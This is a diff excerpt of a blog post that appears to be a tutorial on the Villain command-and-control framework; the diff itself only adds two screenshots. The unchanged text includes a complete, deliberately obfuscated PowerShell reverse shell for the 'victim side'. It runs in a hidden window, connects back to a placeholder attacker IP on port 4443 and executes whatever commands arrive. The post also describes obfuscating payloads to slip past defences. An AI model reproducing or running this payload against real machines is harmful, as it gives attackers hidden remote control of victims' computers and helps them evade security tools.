@@ -31,6 +31,7 @@ pip3 install -r requirements.txt
 ```
 After the installation, we start the villain.
 
+<img src="https://raw.githubusercontent.com/RadeelAhmad/my-portfolio/main/src/content/blog/Images/3.png" alt="Wifi hacking">
 
 command: **python3 Villain.py**
 
@@ -43,6 +44,8 @@ Villain has a built-in auto-obfuscate payload function to assist users bypassing
 ## Victim side
 
 We run the script in the Powers Shell of the victim’s system (Window 11 Pro)
+
+<img src="https://raw.githubusercontent.com/RadeelAhmad/my-portfolio/main/src/content/blog/Images/4.png" alt="Wifi hacking">
 
 ```bash
 Start-Process $PSHOME\powershell.exe -ArgumentList {$client = N''e""w-O'b'je"c"t System.Net.Sockets.TCPClient('YOUR IP',4443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (N''e'w'-O''b""je'c't -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (i''e""x $data 2>&1 | O""u''t-S''t""ring );$sendback2 = $sendback + 'PS ' + (p""w''d).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()} -WindowStyle Hidden
